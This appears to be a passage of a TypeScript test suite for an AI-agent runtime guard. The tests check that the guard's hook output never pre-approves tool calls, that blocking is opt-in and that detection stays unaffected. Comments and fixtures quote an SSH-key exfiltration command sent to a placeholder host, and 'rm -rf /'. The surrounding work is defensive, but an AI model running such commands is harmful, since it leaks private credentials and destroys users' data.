/**
 * Enforcement policy: ATR never approves, blocking is opt-in, and the lane
 * finally has an entrance.
 *
 * WHAT THIS PINS
 *
 * 1. ATR NEVER emits `permissionDecision: "allow"` — in either mode. It is not
 *    a neutral value in the Claude Code PreToolUse contract; it is affirmative
 *    approval that suppresses the host's own permission prompt. Measured on the
 *    451 attacks in data/pint-benchmark/pint-corpus.json with blocking on and
 *    lane=enforce: nothing matched (only maturity=stable rules may fire there)
 *    and all 451 came back "allow" — ATR pre-approving exfiltration it had not
 *    looked for. "No rule matched" is silence, and silence is an omitted field.
 *
 * 2. Blocking off must also stop the second channel. Before this, a benign
 *    `Bash{command:"ls -la"}` produced permissionDecision "allow" while the
 *    ActionExecutor really invoked blockTool on the adapter: the hook said yes
 *    and the action channel said no, on the same event. Observation actions
 *    (alert / snapshot / shadow / escalate) must keep running — suppressing them
 *    would cost detection.
 *
 * 3. Blocking on reproduces the historical severity+confidence matrix for the
 *    decisions that RESTRAIN (deny / ask), so turning the switch on is not a
 *    second behaviour to review. It does not restore the affirmative allow.
 *
 * 4. THE LIBRARY DOES NOT READ THE ENVIRONMENT. ATREngine / ActionExecutor /
 *    HookHandler take explicit config only; ATR_LANE and ATR_BLOCKING are read
 *    by the CLI and passed down. `ATR_LANE=enforce` reaching an embedded engine
 *    silently narrowed detection to maturity=stable — measured on the same 451
 *    attacks: 451/451 samples with matches collapsed to 0/451, with no warning,
 *    because 'enforce' is a perfectly valid value.
 *
 * 5. Detection is never affected by either switch. Same matches, same count,
 *    same severity, in both modes.
 *
 * The destructive/observational split is NOT redefined here: these tests read
 * the same blast-radius ladder the eligibility gate uses
 * (src/quality/action-eligibility.ts), so a new adapter method cannot land on
 * the wrong side of the switch without that module classifying it first.
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { spawnSync } from 'node:child_process';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';

import {
  laneFromConfig,
  blockingFromConfig,
  resolveEnforcementPolicy,
  DEFAULT_BLOCKING,
  DEFAULT_LANE,
  isEnforcementAction,
  parseBooleanFlag,
  parseLane,
  resolveBlocking,
  resolveLane,
} from '../src/enforcement.js';
import { ATREngine } from '../src/engine.js';
import { ActionExecutor } from '../src/action-executor.js';
import {
  HookHandler,
  toClaudeCodePreToolUse,
  toClaudeCodePostToolUse,
} from '../src/hook-handler.js';
import { TIERED_ACTIONS, actionTier, ACTION_TIERS } from '../src/quality/action-eligibility.js';
import type {
  ActionResult,
  AgentEvent,
  ATRRule,
  ExecutionContext,
  HookInput,
  HookOutput,
  PlatformAdapter,
} from '../src/types.js';

const CLI = new URL('../src/cli.ts', import.meta.url).pathname;

// --- helpers ---------------------------------------------------------------

/** Records which PlatformAdapter methods were actually invoked, by name. */
class RecordingAdapter implements PlatformAdapter {
  readonly name = 'recording';
  calls: string[] = [];

  private record(method: string, action: string): ActionResult {
    this.calls.push(method);
    return Object.freeze({
      action: action as ActionResult['action'],
      success: true,
      message: `recorded ${method}`,
      timestamp: new Date().toISOString(),
    });
  }
  async blockInput() { return this.record('blockInput', 'block_input'); }
  async blockOutput() { return this.record('blockOutput', 'block_output'); }
  async blockTool() { return this.record('blockTool', 'block_tool'); }
  async quarantineSession() { return this.record('quarantineSession', 'quarantine_session'); }
  async resetContext() { return this.record('resetContext', 'reset_context'); }
  async alert() { return this.record('alert', 'alert'); }
  async shadow() { return this.record('shadow', 'shadow'); }
  async snapshot() { return this.record('snapshot', 'snapshot'); }
  async escalate() { return this.record('escalate', 'escalate'); }
  async reducePermissions() { return this.record('reducePermissions', 'reduce_permissions'); }
  async killAgent() { return this.record('killAgent', 'kill_agent'); }
}

const MARKER = 'enforcement_fixture_marker';

/** A critical rule that declares one destructive and two observational actions. */
function fixtureRule(overrides: Partial<ATRRule> = {}): ATRRule {
  return {
    title: 'Enforcement fixture',
    id: 'ATR-2026-09101',
    status: 'experimental',
    description: 'Fixture rule for enforcement tests.',
    author: 'ATR Community',
    date: '2026/08/14',
    schema_version: '0.1',
    maturity: 'test',
    severity: 'critical',
    tags: {
      category: 'excessive-autonomy',
      subcategory: 'fixture',
      scan_target: 'both',
      confidence: 'high',
    },
    agent_source: { type: 'tool_call', framework: ['any'], provider: ['any'] },
    detection: {
      method: 'pattern',
      condition: 'any',
      conditions: [
        { field: 'content', operator: 'regex', value: MARKER, description: 'fixture' },
      ],
    },
    response: {
      actions: ['block_tool', 'alert', 'snapshot'],
      message_template: 'fixture',
    },
    ...overrides,
  } as unknown as ATRRule;
}

function markerEvent(): AgentEvent {
  return Object.freeze({
    type: 'tool_call',
    timestamp: new Date().toISOString(),
    content: MARKER,
    fields: Object.freeze({ tool_name: 'Read', tool_args: '{}', content: MARKER }),
  }) as AgentEvent;
}

async function loadedEngine(config: Record<string, unknown> = {}): Promise<ATREngine> {
  const engine = new ATREngine({ rules: [fixtureRule()], ...config });
  const count = await engine.loadRules();
  // CONTROL: the constructor does not compile patterns. Without loadRules() the
  // engine matches nothing and every assertion below would pass vacuously.
  expect(count).toBeGreaterThan(0);
  return engine;
}

const hookOutput = (o: Partial<HookOutput>): HookOutput =>
  Object.freeze({ decision: 'allow', reason: 'r', ...o }) as HookOutput;

/** Restore process.env between tests — these tests set ATR_* deliberately. */
let savedEnv: NodeJS.ProcessEnv;
beforeEach(() => {
  savedEnv = { ...process.env };
  delete process.env['ATR_LANE'];
  delete process.env['ATR_BLOCKING'];
});
afterEach(() => {
  process.env = savedEnv;
});

// --- 1. policy resolution --------------------------------------------------

describe('enforcement policy resolution', () => {
  it('defaults to advisory hunt when nothing is configured', () => {
    expect(DEFAULT_LANE).toBe('hunt');
    expect(DEFAULT_BLOCKING).toBe(false);
    expect(resolveLane(undefined, {})).toBe('hunt');
    expect(resolveBlocking(undefined, {})).toBe(false);
  });

  it('reads the lane from the environment', () => {
    expect(resolveLane(undefined, { ATR_LANE: 'enforce' })).toBe('enforce');
    expect(resolveLane(undefined, { ATR_LANE: 'alert' })).toBe('alert');
    expect(resolveLane(undefined, { ATR_LANE: '  hunt ' })).toBe('hunt');
  });

  it('lets explicit config beat the environment, in both directions', () => {
    expect(resolveLane('enforce', { ATR_LANE: 'hunt' })).toBe('enforce');
    expect(resolveLane('hunt', { ATR_LANE: 'enforce' })).toBe('hunt');
    expect(resolveBlocking(true, { ATR_BLOCKING: '0' })).toBe(true);
    expect(resolveBlocking(false, { ATR_BLOCKING: '1' })).toBe(false);
  });

  it('treats an empty environment value as unset', () => {
    expect(resolveLane(undefined, { ATR_LANE: '' })).toBe('hunt');
    expect(resolveBlocking(undefined, { ATR_BLOCKING: '   ' })).toBe(false);
  });

  it('accepts the documented truthy/falsy spellings for blocking', () => {
    for (const v of ['1', 'true', 'TRUE', 'yes', 'on']) {
      expect(resolveBlocking(undefined, { ATR_BLOCKING: v })).toBe(true);
    }
    for (const v of ['0', 'false', 'no', 'off']) {
      expect(resolveBlocking(undefined, { ATR_BLOCKING: v })).toBe(false);
    }
  });

  // The two switches used to disagree about case: ATR_BLOCKING was insensitive,
  // ATR_LANE was not. `ATR_LANE=ENFORCE ATR_BLOCKING=ON` therefore turned
  // blocking ON while silently widening the lane to hunt — the operator asked
  // for the narrowest enforcement posture and got the broadest, which is the
  // one direction the fallback must never go.
  it('parses both switches case-insensitively, with the same trimming', () => {
    for (const v of ['ENFORCE', 'Enforce', '  eNfOrCe  ']) {
      expect(resolveLane(undefined, { ATR_LANE: v })).toBe('enforce');
      expect(parseLane(v)).toBe('enforce');
    }
    expect(resolveLane('ALERT', {})).toBe('alert');
    for (const v of ['ON', 'On', ' YES ', 'TRUE']) {
      expect(resolveBlocking(undefined, { ATR_BLOCKING: v })).toBe(true);
    }
    for (const v of ['OFF', 'Off', ' NO ', 'FALSE']) {
      expect(resolveBlocking(undefined, { ATR_BLOCKING: v })).toBe(false);
    }
  });

  it('the dangerous pair no longer silently widens the lane', () => {
    const policy = resolveEnforcementPolicy({}, { ATR_LANE: 'ENFORCE', ATR_BLOCKING: 'ON' });
    expect(policy.lane).toBe('enforce');
    expect(policy.blocking).toBe(true);
    expect(policy.notes).toEqual([]);
  });

  it('throws on an unrecognised value instead of silently falling back', () => {
    // A silent fallback is the worst failure mode here: the operator believes
    // they configured enforcement and they did not.
    expect(() => resolveLane('enfroce', {})).toThrow(/Invalid lane/);
    expect(() => resolveLane(undefined, { ATR_LANE: 'block' })).toThrow(/ATR_LANE/);
    expect(() => resolveBlocking(undefined, { ATR_BLOCKING: 'enabled' })).toThrow(/ATR_BLOCKING/);
    expect(parseLane('nope')).toBeNull();
    expect(parseBooleanFlag('maybe')).toBeNull();
  });

  // The lane validated its explicit value from the start; blocking did not, and
  // every non-empty string is truthy — so `blocking: "false"` read as an
  // explicit "off" by its author and turned enforcement ON.
  it('rejects a non-boolean explicit blocking value, "false" above all', () => {
    for (const bad of ['false', 'true', 'no', '', 0, 1, null] as unknown[]) {
      expect(() => resolveBlocking(bad as boolean, {})).toThrow(TypeError);
      expect(() => blockingFromConfig(bad as boolean)).toThrow(/Expected a boolean/);
    }
    // The string that motivated the check is named in the message, because the
    // author of `blocking: "false"` needs to be told why their "off" was an on.
    expect(() => blockingFromConfig('false' as unknown as boolean)).toThrow(/"false"/);
    // Real booleans still pass through untouched.
    expect(blockingFromConfig(true)).toBe(true);
    expect(blockingFromConfig(false)).toBe(false);
    expect(blockingFromConfig(undefined)).toBe(DEFAULT_BLOCKING);
  });

  it('derives the enforce/observe split from the blast-radius ladder', () => {
    for (const action of TIERED_ACTIONS) {
      expect(isEnforcementAction(action)).toBe(actionTier(action) > ACTION_TIERS.OBSERVE);
    }
    expect(isEnforcementAction('alert')).toBe(false);
    expect(isEnforcementAction('snapshot')).toBe(false);
    expect(isEnforcementAction('escalate')).toBe(false);
    expect(isEnforcementAction('shadow')).toBe(false);
    expect(isEnforcementAction('block_tool')).toBe(true);
    expect(isEnforcementAction('kill_agent')).toBe(true);
    expect(isEnforcementAction('quarantine_session')).toBe(true);
    expect(isEnforcementAction('reduce_permissions')).toBe(true);
  });
});

// --- 2. lane entry points --------------------------------------------------

describe('lane has a real entrance', () => {
  it('is hunt by default', async () => {
    const engine = await loadedEngine();
    expect(engine.getLane()).toBe('hunt');
  });

  it('takes the lane from programmatic config', async () => {
    const engine = await loadedEngine({ lane: 'enforce' });
    expect(engine.getLane()).toBe('enforce');
  });

  it('an explicit invalid lane still throws', () => {
    expect(() => new ATREngine({ rules: [fixtureRule()], lane: 'enfroce' as never })).toThrow(
      /lane/i,
    );
  });

  it('actually gates firing: a maturity=test rule fires in hunt, not in enforce', async () => {
    const hunt = await loadedEngine();
    expect(hunt.evaluate(markerEvent()).length).toBeGreaterThan(0);

    const enforce = await loadedEngine({ lane: 'enforce' });
    expect(enforce.getLane()).toBe('enforce');
    expect(enforce.evaluate(markerEvent())).toHaveLength(0);
  });
});

// --- 2b. the library does not read the environment ------------------------

describe('ATR_LANE / ATR_BLOCKING do not reach a library constructor', () => {
  // `new ATREngine()` inside a VS Code extension, a Mastra pipeline, or the
  // /mcp, /openshell-filter and /nemoclaw-preflight subpaths never asked to be
  // reconfigured by a shell profile. And because 'enforce' is a VALID value,
  // the old behaviour produced no warning at all while silently narrowing those
  // callers to maturity=stable rules only.
  it('ATR_LANE=enforce leaves an embedded engine in hunt, and still detecting', async () => {
    process.env['ATR_LANE'] = 'enforce';

    const engine = await loadedEngine();
    expect(engine.getLane()).toBe('hunt');

    // CONTROL: the environment variable is really set and really valid, so a
    // failure here means it was ignored on purpose — not that the value was
    // rejected or the test forgot to set it.
    expect(process.env['ATR_LANE']).toBe('enforce');
    expect(parseLane(process.env['ATR_LANE']!)).toBe('enforce');

    // The detection this used to cost: a maturity=test rule keeps firing.
    expect(engine.evaluate(markerEvent()).length).toBeGreaterThan(0);
  });

  it('a typo in ATR_LANE cannot throw out of the constructor either', async () => {
    process.env['ATR_LANE'] = 'enfroce';
    const engine = await loadedEngine();
    expect(engine.getLane()).toBe('hunt');
    expect(engine.evaluate(markerEvent()).length).toBeGreaterThan(0);
  });

  it('ATR_BLOCKING=1 does not arm an embedded executor', async () => {
    process.env['ATR_BLOCKING'] = '1';
    const engine = await loadedEngine();
    const adapter = new RecordingAdapter();
    const executor = new ActionExecutor({ adapter });

    expect(executor.isBlocking()).toBe(false);
    await engine.evaluateWithVerdict(markerEvent(), executor);

    // CONTROL: alert/snapshot prove the executor reached the adapter at all, so
    // the missing blockTool is suppression rather than a dead code path.
    expect(adapter.calls).toContain('alert');
    expect(adapter.calls).toContain('snapshot');
    expect(adapter.calls).not.toContain('blockTool');
  });

  it('ATR_BLOCKING=1 does not arm an embedded HookHandler', async () => {
    process.env['ATR_BLOCKING'] = '1';
    const handler = new HookHandler({
      engine: await loadedEngine(),
      executor: new ActionExecutor({ adapter: new RecordingAdapter() }),
    });
    expect(handler.isBlocking()).toBe(false);
  });

  it('the config-only resolvers have no overload that reads process.env', () => {
    process.env['ATR_LANE'] = 'enforce';
    process.env['ATR_BLOCKING'] = 'yes';
    expect(laneFromConfig()).toBe(DEFAULT_LANE);
    expect(blockingFromConfig()).toBe(DEFAULT_BLOCKING);
    expect(laneFromConfig('alert')).toBe('alert');
  });
});

// --- 3. channel A: the Claude Code contract --------------------------------

describe('hook contract omits the decision when blocking is off', () => {
  it('emits NO permissionDecision by default, for every outcome', () => {
    for (const decision of ['allow', 'ask', 'deny'] as const) {
      const p = toClaudeCodePreToolUse(hookOutput({ decision, reason: `r-${decision}` }));
      // The whole hookSpecificOutput envelope is dropped: a partial one is not
      // a shape this contract is known to accept, extra top-level atr_* keys
      // demonstrably are.
      expect(p['hookSpecificOutput']).toBeUndefined();
      expect(p['atr_hook_event']).toBe('PreToolUse');
      expect(JSON.stringify(p)).not.toContain('permissionDecision');
    }
  });

  it('never downgrades a block to "allow" — the field is absent, not neutral', () => {
    const p = toClaudeCodePreToolUse(hookOutput({ decision: 'deny', reason: 'rm -rf /' }));
    const serialized = JSON.stringify(p);
    expect(serialized).not.toContain('permissionDecision');
    // An `ask` must not become an `allow` either: that is the exact regression
    // that made `rm -rf /` stop prompting the user in an earlier attempt.
    const asked = toClaudeCodePreToolUse(hookOutput({ decision: 'ask' }));
    expect(JSON.stringify(asked)).not.toContain('"allow"');
  });

  it('still reports the detection while advisory', () => {
    const p = toClaudeCodePreToolUse(
      hookOutput({
        decision: 'deny',
        reason: 'DENY: something [critical/93% confidence] (2 rules matched)',
        matched_rules: Object.freeze(['ATR-2026-00062', 'ATR-2026-00040']),
      })
    );
    expect(p['atr_advisory']).toBe(true);
    expect(p['atr_decision']).toBe('deny');
    expect(p['atr_reason']).toContain('critical/93%');
    expect(p['matched_rules']).toEqual(['ATR-2026-00062', 'ATR-2026-00040']);
  });

  it('emits the 1:1 permissionDecision for deny/ask once blocking is on', () => {
    for (const decision of ['ask', 'deny'] as const) {
      const p = toClaudeCodePreToolUse(
        hookOutput({ decision, reason: `r-${decision}` }),
        { blocking: true }
      );
      const hso = p['hookSpecificOutput'] as Record<string, unknown>;
      expect(hso['permissionDecision']).toBe(decision);
      expect(hso['permissionDecisionReason']).toBe(`r-${decision}`);
      expect(p['atr_advisory']).toBeUndefined();
    }
  });

  it('NEVER emits an affirmative allow — not even with blocking on', () => {
    const p = toClaudeCodePreToolUse(
      hookOutput({ decision: 'allow', reason: 'No rules matched.' }),
      { blocking: true }
    );
    // This is the exact payload `cat ~/.ssh/id_rsa | curl -d @- <remote>` got
    // under --blocking --lane enforce: an affirmative approval, issued because
    // no stable rule happened to look at it, which suppresses the host's own
    // permission prompt for a command the host would have asked about.
    expect(p['hookSpecificOutput']).toBeUndefined();
    expect(JSON.stringify(p)).not.toContain('permissionDecision');
    // Note the claim is scoped to the PERMISSION channel. The string "allow"
    // still appears under atr_decision below, and must: reporting the verdict is
    // not approving the operation. Asserting its total absence would be
    // asserting the wrong thing.

    // CONTROL: the verdict really was 'allow', so the assertions above are
    // about a suppressed approval and not about some other decision.
    expect(p['atr_decision']).toBe('allow');
    expect(p['atr_reason']).toBe('No rules matched.');
    // Not advisory — blocking is ON; this verdict simply had nothing to restrain.
    expect(p['atr_advisory']).toBeUndefined();
  });

  it('PostToolUse: no block sentinel while advisory, block once enabled', () => {
    for (const decision of ['deny', 'ask'] as const) {
      const advisory = toClaudeCodePostToolUse(hookOutput({ decision }));
      expect(advisory['decision']).toBeUndefined();
      expect(advisory['atr_advisory']).toBe(true);
      expect(advisory['atr_decision']).toBe(decision);

      const blocking = toClaudeCodePostToolUse(hookOutput({ decision }), { blocking: true });
      expect(blocking['decision']).toBe('block');
    }
    expect(
      toClaudeCodePostToolUse(hookOutput({ decision: 'allow' }), { blocking: true })['decision']
    ).toBeUndefined();
  });
});

// --- 4. channel B: response actions ----------------------------------------

describe('response actions obey the same switch', () => {
  it('suppresses enforcement actions and keeps observation ones (real engine path)', async () => {
    const engine = await loadedEngine();
    const adapter = new RecordingAdapter();
    const executor = new ActionExecutor({ adapter });
    expect(executor.isBlocking()).toBe(false);

    const { verdict } = await engine.evaluateWithVerdict(markerEvent(), executor);

    // Detection is untouched: the rule matched and still DECLARES block_tool.
    expect(verdict.matchCount).toBeGreaterThan(0);
    expect(verdict.actions).toContain('block_tool');

    // But the adapter was never asked to block. CONTROL: alert/snapshot prove
    // the executor really reached the adapter, so "no blockTool" means
    // suppressed, not "never got there".
    expect(adapter.calls).toContain('alert');
    expect(adapter.calls).toContain('snapshot');
    expect(adapter.calls).not.toContain('blockTool');
  });

  it('dispatches them once blocking is on', async () => {
    const engine = await loadedEngine();
    const adapter = new RecordingAdapter();
    const executor = new ActionExecutor({ adapter, blocking: true });
    expect(executor.isBlocking()).toBe(true);

    await engine.evaluateWithVerdict(markerEvent(), executor);

    expect(adapter.calls).toContain('blockTool');
    expect(adapter.calls).toContain('alert');
    expect(adapter.calls).toContain('snapshot');
  });

  it('a string "false" is a caller bug, not a switch that turns blocking ON', async () => {
    const adapter = new RecordingAdapter();
    expect(
      () => new ActionExecutor({ adapter, blocking: 'false' as unknown as boolean })
    ).toThrow(TypeError);
    // Nothing was constructed, so nothing could have been dispatched.
    expect(adapter.calls).toEqual([]);
  });

  it('reports every suppressed action instead of dropping it silently', async () => {
    const adapter = new RecordingAdapter();
    const executor = new ActionExecutor({ adapter });
    const context = {
      event: markerEvent(),
      matches: [],
      verdict: {
        outcome: 'deny',
        reason: 'x',
        matchCount: 1,
        highestSeverity: 'critical',
        highestConfidence: 0.9,
        actions: Object.freeze(['kill_agent', 'block_input', 'alert'] as const),
        matches: Object.freeze([]),
        timestamp: new Date().toISOString(),
      },
    } as unknown as ExecutionContext;

    const results = await executor.execute(context);
    const byAction = new Map(results.map((r) => [r.action, r]));

    expect(byAction.get('kill_agent')!.message).toMatch(/Suppressed kill_agent \(tier terminate\)/);
    expect(byAction.get('block_input')!.message).toMatch(/Suppressed block_input \(tier interrupt\)/);
    expect(byAction.get('alert')!.message).toBe('recorded alert');
    expect(adapter.calls).toEqual(['alert']);
  });

  it('suppression wins over dry-run: "would execute" is false for a forbidden action', async () => {
    const adapter = new RecordingAdapter();
    const executor = new ActionExecutor({ adapter, dryRun: true });
    const context = {
      event: markerEvent(),
      matches: [],
      verdict: {
        outcome: 'deny',
        reason: 'x',
        matchCount: 1,
        highestSeverity: 'critical',
        highestConfidence: 0.9,
        actions: Object.freeze(['block_tool', 'alert'] as const),
        matches: Object.freeze([]),
        timestamp: new Date().toISOString(),
      },
    } as unknown as ExecutionContext;

    const results = await executor.execute(context);
    const blockTool = results.find((r) => r.action === 'block_tool')!;
    expect(blockTool.message).toContain('[advisory]');
    expect(blockTool.message).not.toContain('[dry-run]');
  });
});

// --- 5. handler wiring -----------------------------------------------------

describe('HookHandler carries the policy', () => {
  it('is advisory by default and keeps the verdict intact', async () => {
    const engine = await loadedEngine();
    const adapter = new RecordingAdapter();
    const handler = new HookHandler({
      engine,
      executor: new ActionExecutor({ adapter }),
    });

    expect(handler.isBlocking()).toBe(false);

    const out = await handler.handlePreToolUse({
      hook: 'PreToolUse',
      tool_name: 'Read',
      tool_input: { content: MARKER },
    } as HookInput);

    // The internal ATR verdict is unchanged — advisory mode changes what is
    // EMITTED to the host, not what ATR concluded.
    expect(out.decision).toBe('deny');
    expect(out.matched_rules).toContain('ATR-2026-09101');

    const payload = toClaudeCodePreToolUse(out, { blocking: handler.isBlocking() });
    expect(payload['hookSpecificOutput']).toBeUndefined();
    expect(JSON.stringify(payload)).not.toContain('permissionDecision');
  });

  it('takes blocking from explicit config only', async () => {
    const engine = await loadedEngine();
    const handler = new HookHandler({
      engine,
      executor: new ActionExecutor({ adapter: new RecordingAdapter(), blocking: true }),
      blocking: true,
    });
    expect(handler.isBlocking()).toBe(true);
  });

  it('a fail-closed guard error still emits no permissionDecision while advisory', async () => {
    const brokenEngine = {
      evaluateWithVerdict: vi.fn(async () => {
        throw new Error('engine crashed');
      }),
    } as unknown as ATREngine;
    const handler = new HookHandler({
      engine: brokenEngine,
      executor: new ActionExecutor({ adapter: new RecordingAdapter() }),
      failOpen: false,
    });

    const stderrSpy = vi.spyOn(process.stderr, 'write').mockReturnValue(true);
    const out = await handler.handlePreToolUse({
      hook: 'PreToolUse',
      tool_name: 'Read',
      tool_input: {},
    } as HookInput);
    stderrSpy.mockRestore();

    // fail-closed still produces a deny internally...
    expect(out.decision).toBe('deny');
    // ...and advisory mode still refuses to vote on permission. "Do not block"
    // means do not block, including when the guard itself is broken.
    const payload = toClaudeCodePreToolUse(out, { blocking: handler.isBlocking() });
    expect(JSON.stringify(payload)).not.toContain('permissionDecision');
  });
});

// --- 6. CLI: the shipping surface ------------------------------------------

describe('atr guard CLI', () => {
  const RULE_YAML = `title: "Enforcement CLI fixture"
id: ATR-2026-09102
rule_version: 1
status: experimental
description: "Fixture rule for the enforcement CLI tests."
author: "ATR Community"
date: "2026/08/14"
schema_version: "0.1"
maturity: test
severity: critical
tags:
  category: excessive-autonomy
  subcategory: fixture
  scan_target: both
  confidence: high
agent_source:
  type: tool_call
  framework: [any]
  provider: [any]
detection:
  method: pattern
  condition: any
  conditions:
    - field: content
      operator: regex
      value: "${MARKER}"
      description: "fixture"
response:
  actions: [block_tool, alert]
  message_template: "fixture"
test_cases:
  true_positives:
    - input: "${MARKER}"
      expected: triggered
  true_negatives:
    - input: "nothing to see"
      expected: not_triggered
`;

  function runGuard(
    args: readonly string[],
    env: Record<string, string> = {}
  ): { status: number; lines: Array<Record<string, unknown>>; stderr: string } {
    const dir = mkdtempSync(join(tmpdir(), 'atr-enforcement-'));
    try {
      const rulesDir = join(dir, 'rules', 'excessive-autonomy');
      mkdirSync(rulesDir, { recursive: true });
      writeFileSync(join(rulesDir, 'ATR-2026-09102-fixture.yaml'), RULE_YAML);

      const r = spawnSync(
        'npx',
        ['tsx', CLI, 'guard', '--rules', join(dir, 'rules'), ...args],
        {
          encoding: 'utf8',
          timeout: 120_000,
          input: JSON.stringify({
            hook: 'PreToolUse',
            tool_name: 'Read',
            tool_input: { content: MARKER },
          }) + '\n',
          env: { ...process.env, ...env },
        }
      );
      const lines = (r.stdout ?? '')
        .split('\n')
        .filter((l) => l.trim().startsWith('{'))
        .map((l) => JSON.parse(l) as Record<string, unknown>);
      return { status: r.status ?? -1, lines, stderr: r.stderr ?? '' };
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  }

  const hso = (line: Record<string, unknown>) =>
    (line['hookSpecificOutput'] ?? {}) as Record<string, unknown>;

  it('is advisory by default: detection reported, no permissionDecision', () => {
    const { status, lines, stderr } = runGuard([]);
    expect(status, stderr).toBe(0);
    expect(lines).toHaveLength(1);
    // CONTROL: the fixture rule must have matched, or "no decision" would be
    // trivially true because nothing was detected.
    expect(lines[0]!['matched_rules']).toEqual(['ATR-2026-09102']);
    expect(lines[0]!['atr_decision']).toBe('deny');
    expect(lines[0]!['hookSpecificOutput']).toBeUndefined();
    expect(hso(lines[0]!)['permissionDecision']).toBeUndefined();
    expect(stderr).toContain('blocking=off');
  });

  it('--blocking turns the decision on', () => {
    const { status, lines, stderr } = runGuard(['--blocking']);
    expect(status, stderr).toBe(0);
    expect(lines[0]!['matched_rules']).toEqual(['ATR-2026-09102']);
    expect(hso(lines[0]!)['permissionDecision']).toBe('deny');
    expect(stderr).toContain('blocking=on');
  });

  it('ATR_BLOCKING turns it on without a flag', () => {
    const { status, lines } = runGuard([], { ATR_BLOCKING: '1' });
    expect(status).toBe(0);
    expect(hso(lines[0]!)['permissionDecision']).toBe('deny');
  });

  it('--no-blocking beats ATR_BLOCKING', () => {
    const { status, lines } = runGuard(['--no-blocking'], { ATR_BLOCKING: '1' });
    expect(status).toBe(0);
    expect(hso(lines[0]!)['permissionDecision']).toBeUndefined();
    expect(lines[0]!['matched_rules']).toEqual(['ATR-2026-09102']);
  });

  it('--lane enforce keeps a maturity=test rule from firing, and approves nothing', () => {
    const { status, lines, stderr } = runGuard(['--lane', 'enforce', '--blocking']);
    expect(status, stderr).toBe(0);
    expect(lines[0]!['matched_rules']).toBeUndefined();
    expect(stderr).toContain('lane=enforce');

    // THE REGRESSION THIS EXISTS FOR. This exact invocation used to answer
    // permissionDecision "allow" to every input the enforce lane did not look
    // at — an affirmative approval that suppresses Claude Code's own permission
    // prompt. Not matching must mean silence.
    expect(lines[0]!['hookSpecificOutput']).toBeUndefined();
    expect(hso(lines[0]!)['permissionDecision']).toBeUndefined();
    expect(JSON.stringify(lines[0])).not.toContain('permissionDecision');
    // CONTROL: blocking really is on for this run, so the omission is about the
    // verdict rather than about the mode.
    expect(stderr).toContain('blocking=on');
    expect(lines[0]!['atr_advisory']).toBeUndefined();
    expect(lines[0]!['atr_decision']).toBe('allow');
  });

  it('ATR_LANE does the same, and --lane overrides it', () => {
    const viaEnv = runGuard(['--blocking'], { ATR_LANE: 'enforce' });
    expect(viaEnv.stderr).toContain('lane=enforce');
    expect(viaEnv.lines[0]!['matched_rules']).toBeUndefined();

    const flagWins = runGuard(['--lane', 'hunt', '--blocking'], { ATR_LANE: 'enforce' });
    expect(flagWins.stderr).toContain('lane=hunt');
    expect(flagWins.lines[0]!['matched_rules']).toEqual(['ATR-2026-09102']);
  });

  it('rejects a misspelled lane instead of quietly running in hunt', () => {
    const { status, stderr } = runGuard(['--lane', 'enfroce']);
    expect(status).toBe(1);
    expect(stderr + '').toContain('Invalid --lane');
  });

  it('rejects contradictory blocking flags', () => {
    const { status, stderr } = runGuard(['--blocking', '--no-blocking']);
    expect(status).toBe(1);
    expect(stderr).toContain('mutually exclusive');
  });

  it('a typo in ATR_BLOCKING warns but still starts the guard and still detects', () => {
    const { status, lines, stderr } = runGuard([], { ATR_BLOCKING: 'enabled' });
    // Exit 0 is the point: as a Claude Code command hook, a non-zero status is
    // mapped to a non-blocking error whose stderr is never rendered, so exiting
    // would silently cost the detection below and explain nothing.
    expect(status, stderr).toBe(0);
    expect(stderr).toContain('NOT enabled');
    expect(stderr).toContain('blocking=off');
    // Detection survived the typo — this is what exiting would have thrown away.
    expect(lines[0]!['matched_rules']).toEqual(['ATR-2026-09102']);
    expect(hso(lines[0]!)['permissionDecision']).toBeUndefined();
  });

  it('a typo in ATR_LANE warns, keeps detecting, and refuses to block', () => {
    const { status, lines, stderr } = runGuard(['--blocking'], { ATR_LANE: 'enfroce' });
    expect(status, stderr).toBe(0);
    expect(stderr).toContain('Blocking disabled');
    expect(stderr).toContain('lane=hunt');
    expect(stderr).toContain('blocking=off');
    // Full-breadth detection is retained; only enforcement is withheld, because
    // blocking on the wider fallback lane is not what the operator asked for.
    expect(lines[0]!['matched_rules']).toEqual(['ATR-2026-09102']);
    expect(hso(lines[0]!)['permissionDecision']).toBeUndefined();
  });
});

// --- 7. `atr scan --lane` and the GitHub Action's `lane:` input -------------

describe('atr scan --lane end to end', () => {
  // This plumbing shipped with no test at all: `--lane` could be deleted from
  // the CLI, from ScanOptions, and from both engine construction sites and the
  // whole suite stayed green. These run the real binary against a real rules
  // directory and assert on the scan's own JSON output.

  const RULE_ID = 'ATR-2026-09103';
  const RULE_YAML = `title: "Scan lane fixture"
id: ${RULE_ID}
rule_version: 1
status: experimental
description: "Fixture rule for the scan lane tests."
author: "ATR Community"
date: "2026/08/14"
schema_version: "0.1"
maturity: test
severity: critical
tags:
  category: excessive-autonomy
  subcategory: fixture
  scan_target: both
  confidence: high
agent_source:
  type: tool_call
  framework: [any]
  provider: [any]
detection:
  method: pattern
  condition: any
  conditions:
    - field: content
      operator: regex
      value: "${MARKER}"
      description: "fixture"
response:
  actions: [alert]
  message_template: "fixture"
test_cases:
  true_positives:
    - input: "${MARKER}"
      expected: triggered
  true_negatives:
    - input: "nothing to see"
      expected: not_triggered
`;

  function runScan(
    args: readonly string[],
    env: Record<string, string> = {}
  ): { status: number; json: Record<string, unknown> | null; stdout: string; stderr: string } {
    const dir = mkdtempSync(join(tmpdir(), 'atr-scan-lane-'));
    try {
      const rulesDir = join(dir, 'rules', 'excessive-autonomy');
      mkdirSync(rulesDir, { recursive: true });
      writeFileSync(join(rulesDir, `${RULE_ID}-fixture.yaml`), RULE_YAML);

      const eventsPath = join(dir, 'events.json');
      writeFileSync(
        eventsPath,
        JSON.stringify([
          { type: 'tool_call', timestamp: '2026-08-14T00:00:00Z', content: MARKER },
        ])
      );

      const r = spawnSync(
        'npx',
        ['tsx', CLI, 'scan', eventsPath, '--rules', join(dir, 'rules'), '--json',
         '--no-report', ...args],
        { encoding: 'utf8', timeout: 120_000, env: { ...process.env, ...env } }
      );
      const stdout = r.stdout ?? '';
      const start = stdout.indexOf('{');
      let json: Record<string, unknown> | null = null;
      if (start !== -1) {
        try {
